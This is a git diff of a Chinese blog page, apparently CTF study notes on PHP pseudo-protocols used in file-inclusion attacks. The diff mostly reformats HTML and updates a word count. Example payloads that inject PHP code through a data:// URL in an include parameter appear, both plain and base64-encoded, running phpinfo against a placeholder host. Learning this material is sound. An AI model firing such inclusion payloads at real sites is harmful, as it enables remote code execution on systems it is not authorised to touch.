@@ -500,15 +500,16 @@
 </ol>
 <h2 id="大佬的博客"><a href="#大佬的博客" class="headerlink" title="大佬的博客"></a>大佬的博客</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jeff_12138/article/details/124815370">https://blog.csdn.net/Jeff_12138/article/details/124815370</a></p>
 <h2 id="什么时候使用php伪协议"><a href="#什么时候使用php伪协议" class="headerlink" title="什么时候使用php伪协议"></a>什么时候使用php伪协议</h2><h3 id="文件包含时使用"><a href="#文件包含时使用" class="headerlink" title="文件包含时使用!!!"></a>文件包含时使用!!!</h3><ol>
-<li>例如这个时候：<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720163511.png"><h3 id="可能遇见的文件包含函数"><a href="#可能遇见的文件包含函数" class="headerlink" title="可能遇见的文件包含函数"></a>可能遇见的文件包含函数</h3><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720163727.png"></li>
+<li>例如这个时候：<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720163511.png"></li>
 </ol>
+<h3 id="可能遇见的文件包含函数"><a href="#可能遇见的文件包含函数" class="headerlink" title="可能遇见的文件包含函数"></a>可能遇见的文件包含函数</h3><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720163727.png"></p>
 <h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h2><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h3><ol>
 <li>allow_url_fopen:on<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720160552.png"></li>
 <li>allow_url_include:on<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720161022.png"></li>
 <li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720161043.png"></li>
 </ol>
 <h3 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h3><pre class="line-numbers language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain,
-data:&#x2F;&#x2F;text&#x2F;plain;base64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+data:&#x2F;&#x2F;text&#x2F;plain;base64,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><ol>
 <li>data://text/plain,    可以把后面的伪代码当作代码执行<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo?&gt;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li>data://text/plain;base64,<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b   &#x2F;&#x2F;后面这一串就是base64编码后的&lt;?php phpinfo()?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
@@ -1071,7 +1072,7 @@ data:&#x2F;&#x2F;text&#x2F;plain;base64<span aria-hidden="true" class="line-numb
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">108.4k</span>&nbsp;字
+                class="white-color">111.1k</span>&nbsp;字
             
             
             
